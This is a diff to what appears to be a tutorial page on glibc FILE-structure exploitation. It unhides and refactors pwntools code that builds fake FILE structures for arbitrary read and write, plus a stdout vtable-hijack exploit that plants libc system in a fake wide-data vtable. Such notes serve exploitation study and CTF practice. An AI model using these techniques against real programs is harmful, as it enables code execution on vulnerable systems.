@@ -20,7 +20,7 @@
 
 <https://elixir.bootlin.com/glibc/glibc-2.38/source/libio/bits/types/struct_FILE.h#L49>
 
-```c,hidelines=//
+```c
 struct _IO_FILE
 {
   int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
@@ -284,11 +284,11 @@ Requirements:
 Example using [`pwntools`](https://docs.pwntools.com/en/stable/filepointer.html#module-pwnlib.filepointer)
 to setup for writing `nb` number of bytes into address `target_address`
 
-```py,hidelines=~
+```py
 from pwn import *
 
-~target_address = 0x1337
-~nb = 0x100
+target_address = 0x1337
+nb = 0x100
 fs = FileStructure()
 # flags taken from unbuffered _IO_2_1_stdin_, but most importantly 0xfbad208b & _IO_NO_READS == 0
 fs.flags = 0xfbad208b
@@ -327,11 +327,11 @@ Requirements:
 Example using [`pwntools`](https://docs.pwntools.com/en/stable/filepointer.html#module-pwnlib.filepointer)
 to setup for reading `nb` number of bytes from address `target_address`
 
-```py,hidelines=~
+```py
 from pwn import *
 
-~target_address = 0x1337
-~nb = 0x100
+target_address = 0x1337
+nb = 0x100
 fs = FileStructure()
 # flags taken from unbuffered _IO_2_1_stdout_, but most importantly 0xfbad2887 & _IO_NO_WRITES == 0
 fs.flags = 0xfbad2887
@@ -388,7 +388,7 @@ _IO_fwrite (const void *buf, size_t size, size_t count, FILE *fp)
 
 Cross check using disassembler
 
-```console,hidelines=~
+```console
 gef> disass fwrite
 Dump of assembler code for function __GI__IO_fwrite:
    [snip]
@@ -574,24 +574,24 @@ Dump of assembler code for function __GI__IO_wdoallocbuf:
 
 Here is an example using `pwntools`
 
-```py,hidelines=~
+```py
 from pwn import *
 
 elf = context.binary = ELF("/path/to/binary", checksec=False)
 libc = elf.libc
-~
-~def start(argv=[], *a, **kw):
-~    nc = "nc localhost 1337"
-~    nc = nc.split()
-~    host = args.HOST or nc[1]
-~    port = int(args.PORT or nc[2])
-~    if args.REMOTE:
-~        return remote(host, port)
-~    else:
-~        args_ = [elf.path] + argv
-~        if args.NA:  # NOASLR
-~            args_ = ["setarch", "-R"] + args_
-~        return process(args_, env=env, *a, **kw)
+
+def start(argv=[], *a, **kw):
+    nc = "nc localhost 1337"
+    nc = nc.split()
+    host = args.HOST or nc[1]
+    port = int(args.PORT or nc[2])
+    if args.REMOTE:
+        return remote(host, port)
+    else:
+        args_ = [elf.path] + argv
+        if args.NA:  # NOASLR
+            args_ = ["setarch", "-R"] + args_
+        return process(args_, env=env, *a, **kw)
 
 
 def aaw(addr, data):
@@ -603,9 +603,10 @@ def aar(addr, data):
     # Helper function to perform arbitrary address write
     pass
 
-~env = {}
+env = {}
 io = start()
 
+fake_wide_vtable = elf.bss(0x400)
 # Create overlapping fake _IO_wide_data struct and fake _wide_vtable @ bss+0x400
 payload = b""
 # doing this ensures both fp->_wide_data->_IO_write_base and
@@ -613,16 +614,16 @@ payload = b""
 payload = payload.ljust(0x68, b"\x00")
 payload += p64(libc.sym["system"])  # _wide_vtable+0x68, which is also fp->_wide_data->_codecvt
 payload = payload.ljust(0xe0, b"\x00")
-payload += p64(elf.bss(0x400))  # fp->_wide_data->_wide_vtable
+payload += p64(fake_wide_vtable)  # fp->_wide_data->_wide_vtable
 
-aaw(elf.bss(0x400), payload)
+aaw(fake_wide_vtable, payload)
 
 # Overwrite _IO_2_1_stdout_ vtable to call _IO_wfile_overflow
 fs = FileStructure()
 fs.flags = u32(b"dash")
 fs.fileno = 1
 fs._lock = libc.sym["_IO_stdfile_1_lock"]
-fs._wide_data = elf.bss(0x400)
+fs._wide_data = fake_wide_vtable
 # 0x38 is the function offset inside vtable
 # 0x18 is __overflow offset for _IO_jump_t
 fs.vtable = libc.sym["_IO_wfile_jumps"] - 0x38 + 0x18
